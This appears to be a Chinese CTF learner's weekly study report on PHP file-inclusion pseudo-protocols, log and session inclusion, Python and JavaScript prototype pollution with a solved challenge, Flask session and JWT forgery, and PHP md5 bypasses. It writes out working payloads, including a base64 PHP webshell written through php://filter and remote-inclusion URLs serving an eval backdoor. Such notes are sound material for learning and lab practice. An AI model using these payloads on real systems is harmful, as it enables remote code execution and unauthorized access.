# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. include-labs通过
2. ?ctf-2025题目复现
>包括md5绕过、正则表达式、越权访问、原型污染等
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
isctf比赛
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
## 文件包含漏洞
### 伪协议
+ #### file协议
```php
file://[绝对路径]
```
>访问本地文件系统

被包含的文件是否能被执行只取决于其文件内容，而不是文件扩展名。
include()和require()语句会将指定文件的内容作为 PHP 代码来执行，因此不会回显静态变量等无输出内容
+ #### data协议
```php
data://text/plain,<?php phpinfo();?>
```
>allow_url_fopen=on
>allow_url_include=on

支持base64编码传递
```php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```
+ #### http://&https:// 协议
```php
http://[域名或IP]/[路径]/[文件名]
```
>allow_url_fopen=on
>allow_url_include=on

内网访问:
```php
http://127.0.0.1/backdoor.txt
```
远程包含:
```php
https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI
https://gitee.com/Probius/PHPinclude-labs/raw/main/RFI

#<?php @eval($_POST['a']); ?>
```
+ #### php://input
>allow_url_include:On

注意: enctype="multipart/form-data" 的时候**php://input**是无效的

+ #### php://filter

过滤器
```php
filter/string.rot13/resource=/flag//字符串转码，不支持读取php
string.rot13 rot13变换
string.toupper 转大写字母
string.tolower 转小写字母
```

```php
filter/convert.base64-encode/resource=flag.php//转换过滤器，支持读取php
convert.base64-encode/decode//base64编码解码
convert.quoted-printable-encode/decode//quoted-printable编码解码,类似于url编码
convert.iconv.<input-encoding>.<output-encoding>//字符编码转换
```
write模式
>可用write模式创建文件
```php
file_put_contents($filename,$data);

pl:php://filter/write=convert.base64-decode/resource=backdoor.php
data=PD9waHAgZXZhbCgkX1BPU1RbJ2hlbGwnXSk7Pz4
```
+ #### 压缩流
```php
zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
compress.zlib://file.gz
compress.bzip2://file.bz2
```
+ #### PHP 归档
```php
phar://[归档文件绝对路径]/[归档内的文件路径]
```
### 其他注入点
>在参数被过滤的情况下，通常使用日志文件包含的方式来绕过
>中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell
#### 日志文件包含
+ #### Nginx
>默认Nginx日志路径
/var/log/nginx/access.log //访问日志
/var/log/nginx/error.log //错误日志

先判断日志类型，再根据类型抓包注入木马

+ #### Apache
>默认Apache日志路径
/var/log/apache2/access.log //访问日志

#### Session文件包含
>将恶意代码输入参数中使服务器生成session文件，再通过包含session文件实现代码执行

1. 先通过phpinfo找到session文件存放路径
```php
?para=<?php phpinfo();?>
```
session.save_path 一项

2. 输入恶意代码，再包含相应session文件
>session文件名一般为sess_加上session id

seesionid可以通过cookie获取，开发者工具查看application->Cookies->PHPSESSID

## 原型链污染
>由于不当用户输入过滤和对象合并处理，攻击者可以向应用程序的原型链中注入恶意属性，从而污染所有继承该原型的对象

网页的后端源码可以尝试通过访问/src，/app.py路由或其他泄露方式得到
+ #### python源码
>python中对象的原型就是基类，python中每个对象通过__class__属性指向其所属类，类通过__base__属性指向父类。当访问对象属性时，若当前对象/类中未定义，会沿原型链向上查找，直到基类

利用关键:merge递归合并
```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```
>hasattr(obj, name):判断对象obj是否有属性name,如果是返回Ture
>getattr(object, name):获取对象object的属性name的值
>setattr(object, name, value):设置对象object的属性name的值为value,或新增属性name，值为value

可以看到merge函数会递归合并src到dst中，如果dst中有对应的key且value是字典类型，则继续递归合并，否则直接赋值(合并)

比如:
```python
target = { a: 1, b: { x: 10 } };
source = { b: { y: 20 }, c: 30 };

merge(target, source);
// 结果：{ a: 1, b: { x: 10, y: 20 }, c: 30 }
```
实战中通过传递恶意属性到merge函数的src参数中，可以增加或修改dst对象的原型链上的属性

有两种类型的payload:
1. 污染父属性
```python
"__class__" : {
        "__base__" : {
            "flag" : "True"
        }
    }

```
2. 污染全局变量或者无继承关系的类
```python
 "__class__" : {
        "__init__" : {
            "__globals__" : {
                "flag" : "True"
            }
        }
    }

```
两者区别在于污染的对象位置

比如2025年?CTF-这是什么函数:
```python
from flask import Flask,request,render_template
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
#merge函数
def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False
#判断是否为json格式

class cls():
    def __init__(self):
        pass

instance = cls()

cat = "where is the flag?"
dog = "how to get the flag?"

@app.route('/flag', methods=['GET', 'POST'])
def flag():
    with open('/flag','r') as f:
        flag = f.read().strip()
    if cat == dog:
        return flag 
        #只有在cat等于dog时才在/flag页面显示flag
    else:
        return cat + " " + dog

@app.route('/src', methods=['GET', 'POST'])
def src():
    return open(__file__, encoding="utf-8").read()

```
由于dog和cat变量均为全局变量，且cls类与全局变量无继承关系，所以需要使用第二种
payload:
```json
{
    "__init__": {
        "__globals__": {
            "dog": "where is the flag?"
        }
    }
}
```
当然，由于/src会读取__file__，我们也可以从这下手
>__file__是 Python 模块的一个内置全局变量
```python
{
    "__init__": {
        "__globals__": {
            "__file__": "/flag"
        }
    }
}
```
+ #### js源码
>js中对象的原型是通过__proto__属性指向其原型对象
1.prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法
2.一个对象的__proto__属性，指向这个对象所在的类的prototype属性
当访问对象属性时，若当前对象中未定义，会沿原型链向上查找，直到原型链的顶端(null)，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象
```javascript
migu --> Cat.prototype --> Object.prototype --> null
主要攻击对象:Object.prototype
```

利用关键:同样是merge递归合并的赋值操作

使用JSON.parse()，是因为这个方法可以将JSON字符串解析为值或对象。所以在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，利于进行合并操作

```javascript
for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
```
注意这串payload，由于对象都拥有__proto__属性，最终o1["\__proto__"]和o2["\__proto__"]进行合并，即o1.\__proto__(Object.prototype).b=2，从而影响所有对象

## 越权访问
>越权访问是指攻击者通过绕过访问控制机制，获取本不应拥有的权限或资源的行为。这种漏洞通常出现在应用程序未正确实施访问控制策略时，导致用户能够访问或操作他们不被授权的资源。

#### Flask的SESSION伪造
>Flask默认使用客户端会话管理机制，将会话数据存储在客户端的Cookie中，并使用一个密钥对数据进行签名以防篡改。然而，如果攻击者能够猜测或获取这个密钥，他们就可以伪造Cookie，从而伪造会话数据，获得更高权限的访问

flask签名算法:
>数据 -> 序列化 -> 压缩(可选) -> Base64编码 -> 添加时间戳 -> 签名 -> 最终cookie

加密后格式:
>base64(数据).base64(时间戳).base64(用key对数据和时间戳进行HMAC加密得到签名)

由此可知，要伪造flask的session cookie，关键在于获取flask应用使用的密钥(secret_key)

常见获取flask secret_key的方法:
1. 在Flask应用代码中查找
2. 在环境变量中查找
3. 通过配置文件泄露获取

之后我们利用可以自己伪造cookie替换掉浏览器中的cookie，从而覆盖session达到越权访问的目的
还可以进行session注入，进行rce攻击

#### JWT校验
>JWT（JSON Web Token）是一种用于在网络应用环境中传递声明的紧凑且自包含的方式。JWT通常用于身份验证和信息交换。JWT由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。其中，签名部分用于验证令牌的完整性和真实性

Header:
```json
{
  "alg": "HS256",//签名算法
  "typ": "JWT" //令牌类型，默认JWT
}
```
Payload:存储用户信息
Signature:根据Header的alg进行签名
```python
EncodeString = Base64(header).Base64(payload)
token = HS256(EncodeString,"秘钥")
```
再将前面两部分进行base64编码，用点号连接，形成最终的JWT令牌

此类密匙无法寻找，有两种常见绕过方法:
1. none算法绕过
JWT规范允许使用"none"算法，表示不进行签名验证。如果应用程序没有正确验证JWT的签名算法，攻击者可以将JWT的算法字段修改为"none"，并移除签名部分，从而绕过签名验证
2. 弱密匙爆破
如果JWT使用了弱密钥进行签名，攻击者可以通过暴力破解或字典攻击来猜测密钥。一旦获得密钥，攻击者就可以伪造有效的JWT令牌，从而获得未授权的访问权限

再伪造JWT令牌后，可以将其寻找漏洞替换掉浏览器中的JWT，从而实现越权访问或rce攻击

>此过程可使用jwt_tool工具

## php特性
### md5绕过
+ #### 弱比较碰撞
>0e当0

QNKCDZO
240610708

+ #### 数组法
>对于强比较，md5无法解析数组，会返回null，可以传两个数组

a[]=1
b[]=2

+ #### 强碰撞
>md5不加盐

TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak

>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3Bu%93%D8Igm%A0%D1U%5D%83%60%FB%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB%07%FE%A2

>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

### 函数特性
```php
intval($a,$b)
```
>将字符串a转换为整数，b为进制，默认10进制
b也可以为0，表示自动检测进制:0x开头为16进制，0开头为8进制，其它为10进制

利用b的特殊性，可以用八进制，十六进制绕过过滤

### php变量特性
>php自动把变量里的.和空格转换为_
当php版本小于8时，如果参数中出现中括号[，会被转换成下划线_，并且忽视后面的非法字符

# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
include漏洞以及?ctf复现